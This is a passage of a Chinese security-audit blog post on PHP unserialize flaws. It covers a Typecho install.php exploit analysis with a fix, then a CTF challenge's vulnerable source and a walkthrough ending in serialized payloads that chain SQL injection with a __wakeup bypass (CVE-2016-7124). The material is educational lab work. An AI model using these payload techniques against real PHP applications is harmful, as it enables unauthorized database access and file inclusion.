+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180912184815-5a08c69e-b679-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180912184815-5a08c69e-b679-1.png" alt="img"></a></p>
+<p>接下来我们去看一下 <strong>Typecho_Feed</strong> 类的构造，该类在 <strong>var/Typecho/Feed.php</strong> 文件中，代码如下：</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180912184815-5a455b4a-b679-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180912184815-5a455b4a-b679-1.png" alt="img"></a></p>
+<p>上图代码 <strong>第7行</strong> ，满足 <strong>self::RSS2</strong> 与 <strong>$this-&gt;_type</strong> 相等进入该分支，所以 <strong>$this-&gt;_type</strong> 需要构造，<strong>item[&#39;author&#39;]</strong> 为触发点，需要构造 <strong>$this_items</strong> ，具体构造如下：</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180912184815-5a795706-b679-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180912184815-5a795706-b679-1.png" alt="img"></a></p>
+<p>代码 <strong>22行</strong> 在实际利用没必要添加，install.php在代码 <strong>54行</strong> 调用 <strong>ob_start()</strong> 函数，该函数对输出内容进行缓冲,反序列化漏洞利用结束后，在<strong>var\Typecho\Db.php</strong>代码121行，触发异常，在 <strong>var\Typecho\Common.php</strong> 代码237行调用 <strong>ob_end_clean()函数</strong> 清除了缓冲区内容，导致无法看见执行结果，考虑在进入到异常处理前提前报错结束程序。由此构造该数据。执行结果如下：</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180912184816-5a93a69c-b679-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180912184816-5a93a69c-b679-1.png" alt="img"></a></p>
+<p><strong>修复建议</strong></p>
+<p>造成该漏洞的原因主要有两点：</p>
+<ul>
+<li>当 <strong>config.inc.php</strong> 文件存在的时，可绕过判断继续往下执行代码。</li>
+<li>传入反序列化函数的参数可控</li>
+</ul>
+<p>修复方法：在 <strong>install.php</strong> 文件第一行判断 <strong>config.inc.php</strong> 是否存在，如果存在，则退出代码执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (file_exists(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/config.inc.php'</span>))</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $args;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__conn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db_host, $db_name, $db_user, $db_pass, $DEBUG;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;conn)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);</span><br><span class="line">        mysql_select_db($db_name, <span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">        <span class="keyword">if</span> ($DEBUG) &#123;</span><br><span class="line">            $sql = <span class="string">"DROP TABLE IF  EXISTS  users"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">            $sql = <span class="string">"CREATE TABLE IF NOT EXISTS users (username VARCHAR(64),</span></span><br><span class="line"><span class="string">            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">            $sql = <span class="string">"INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mysql_query(<span class="string">"SET names utf8"</span>);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode = 'strict_all_tables'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__query</span><span class="params">($sql, $back=true)</span> </span>&#123;</span><br><span class="line">        $result = @mysql_query($sql);</span><br><span class="line">        <span class="keyword">if</span> ($back) &#123;</span><br><span class="line">            <span class="keyword">return</span> @mysql_fetch_object($result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($username, $password) = func_get_args();</span><br><span class="line">        $sql = sprintf(<span class="string">"SELECT * FROM users WHERE username='%s' AND password='%s'"</span>, $username, md5($password));</span><br><span class="line">        $obj = <span class="keyword">$this</span>-&gt;__query($sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( $obj != <span class="keyword">false</span> ) &#123;</span><br><span class="line">            define(<span class="string">'IN_FLAG'</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadData($obj-&gt;role);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;__die(<span class="string">"sorry!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span> &amp;&amp; !preg_match(<span class="string">'/O:\d:/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__die</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">        header(<span class="string">"Content-Type: application/json"</span>);</span><br><span class="line">        <span class="keyword">die</span>( json_encode( <span class="keyword">array</span>(<span class="string">"msg"</span>=&gt; $msg) ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mysql_close(<span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"login"</span>, <span class="string">"source"</span>))) &#123;</span><br><span class="line">            @call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">"What do you do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"data"</span>])) &#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">"data"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> HITCON(<span class="string">"source"</span>, <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>config.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $db_host = <span class="string">'localhost'</span>;</span><br><span class="line">    $db_name = <span class="string">'test'</span>;</span><br><span class="line">    $db_user = <span class="string">'root'</span>;</span><br><span class="line">    $db_pass = <span class="string">'123'</span>;</span><br><span class="line">    $DEBUG = <span class="string">'xx'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">!defined(<span class="string">'IN_FLAG'</span>) &amp;&amp; <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;un3eri@liz3_i3_s0_fun&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题主要考察对php反序列化函数的利用，以及常见的绕过方法。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180930160812-f9a5b2a4-c487-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180930160812-f9a5b2a4-c487-1.png" alt="img"></a></p>
+<p>访问<strong>flag.php</strong>,显示禁止访问，题目默认显示源码，在下图<strong>代码57行</strong>，数据库查询内容不为空的情况下，定义常量<strong>IN_FLAG</strong>，猜测需要满足该条件才能访问<strong>flag.php</strong>。然后调用<strong>loadData</strong>函数。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180930160818-fd1ec7ea-c487-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180930160818-fd1ec7ea-c487-1.png" alt="img"></a></p>
+<p><strong>loadData</strong>函数，对传入参数进行判断，如果验证通过，则作为参数传入到反序列化函数，验证不通过返回为空，该判断绕过可参考Day11,传入内容来源于数据库查询结果，此时可考虑如何构造数据库查询结果。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180930160823-005e3dbe-c488-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180930160823-005e3dbe-c488-1.png" alt="img"></a></p>
+<p>在<strong>index.php</strong>页面显示源码中，我们发现<strong>SoFun</strong>类,如下图，在<strong>__destruct()</strong>函数中，会对类变量<strong>$this-&gt;file</strong>所对应的文件进行包含，类变量反序列化可控，在<strong>loadData</strong>函数调用前，对<strong>IN_FLAG</strong>常量进行了设置，如果<strong>loadData</strong>函数传入参数值为<strong>SoFun</strong>类反序列化字符串，且控制类变量<strong>$this-&gt;file=flag.php</strong>，则可以包含flag.php文件，此时<strong>&#39;IN_FLAG&#39;</strong>已经设置，可获取到flag，需考虑绕过<strong>__wakeup</strong>函数。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180930160829-039dce9a-c488-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180930160829-039dce9a-c488-1.png" alt="img"></a></p>
+<p>考虑如何控制<strong>loadData</strong>函数传入参数的值，从下图可知，<strong>$obj-&gt;role</strong>来源于数据库查询结果，而构建sql语句的username字段来源于<strong>$username</strong>,<strong>$username</strong>变量来源于<strong>func_get_args()函数</strong>,该函数返回包含调用函数参数列表的数组,如果<strong>login()</strong>函数传入参数可控，可通过<strong>union联合查询</strong>，构造查询结果，使构造数据为SoFun类序列化字符串。我们去看一下login函数的调用。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180930160837-086325ec-c488-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180930160837-086325ec-c488-1.png" alt="img"></a></p>
+<p>在<strong>HITCON</strong>类<strong>__destruct</strong>方法中，通过<strong>call_user_func_array()</strong>函数调用login或source方法，如果<strong>$this-&gt;method=&#39;login&#39;</strong>则可以调用<strong>login()</strong>函数，<strong>$this-&gt;method</strong>为类变量，反序列化可控。<strong>$this-&gt;args</strong>为调用函数传入参数，意味着login函数中$username变量可控，此时可通过SQL注入，构造查询数据。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180930160843-0c3a00b4-c488-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180930160843-0c3a00b4-c488-1.png" alt="img"></a></p>
+<p>在进行反序列化时，会调用<strong>__wakeup</strong>对类变量args进行处理，此时调用<strong>mysql_escape_string</strong>函数对<strong>$this-&gt;args</strong>进行转义。可通过<strong>CVE-2016-7124</strong>，序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过<strong>__wakeup</strong>的执行。绕过检测，进行sql注入。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180930160849-0f995372-c488-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180930160849-0f995372-c488-1.png" alt="img"></a></p>
+<p>总结一下思路：</p>
+<p>1.构造<strong>HITCON</strong>类反序列化字符串，其中<strong>$method=&#39;login&#39;</strong>,<strong>$args</strong>数组&#39;username&#39;部分可用于构造SQL语句，进行SQL注入，&#39;password&#39;部分任意设置。</p>
+<p>2.调用<strong>login()</strong>函数后，利用<strong>$username</strong>构造联合查询，使查询结果为<strong>SoFun类</strong>反序列化字符串，设置<strong>$file=&#39;flag.php&#39;</strong>，需绕过<strong>__wakeup()</strong>函数。</p>
+<p>3.绕过<strong>LoadData()</strong>函数对反序列化字符串的验证,参考Day11。</p>
+<p>4.SoFun类 <strong>__destruct()</strong>函数调用后,包含flag.php文件，获取flag，需绕过<strong>__wakeup()函数</strong>。</p>
+<p>第二个答案是另一种思路，大家可研究一下。</p>
+<p>注：因为传参方式为GET，注意进行URL编码。</p>
+<p>参考答案：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;HITCON&quot;:3:&#123;s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:&#123;s:8:&quot;username&quot;;s:81:&quot;1&apos; union select 1,2,&apos;a:1:&#123;s:2:&quot;xx&quot;;O:%2b5:&quot;SoFun&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&apos;%23&quot;;s:8:&quot;password&quot;;s:3:&quot;234&quot;;&#125;&#125;</span><br><span class="line">O:5:&quot;SoFun&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">a:1:&#123;s:2:&quot;xx&quot;;O:5:&quot;SoFun&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</span><br><span class="line">O:5:&quot;SoFun&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:2:&quot;ff&quot;;O:6:&quot;HITCON&quot;:5:&#123;s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:&#123;i:0;s:12:&quot;1&apos; or &apos;1&apos;--+&quot;;i:1;s:3:&quot;111&quot;;&#125;s:4:&quot;conn&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180930160856-144ba618-c488-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180930160856-144ba618-c488-1.png" alt="img"></a></p>
+<p>转载自：<a href="https://xz.aliyun.com/t/2733" target="_blank" rel="noopener">https://xz.aliyun.com/t/2733</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/09/01/PHP-Audit-Labs-Day11-unserialize反序列化漏洞/" title="PHP-Audit-Labs-Day11-unserialize反序列化漏洞">https://wh0ale.github.io/2019/09/01/PHP-Audit-Labs-Day11-unserialize反序列化漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/08/30/Metasploit总结-持续更新/" rel="next" title="Metasploit总结--持续更新">
+                <i class="fa fa-chevron-left"></i> Metasploit总结--持续更新
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/09/02/子域名接管/" rel="prev" title="子域名接管">
+                子域名接管 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-Audit-Labs"><span class="nav-number">1.</span> <span class="nav-text">PHP-Audit-Labs</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实例分析"><span class="nav-number">2.</span> <span class="nav-text">实例分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF"><span class="nav-number">3.</span> <span class="nav-text">CTF</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
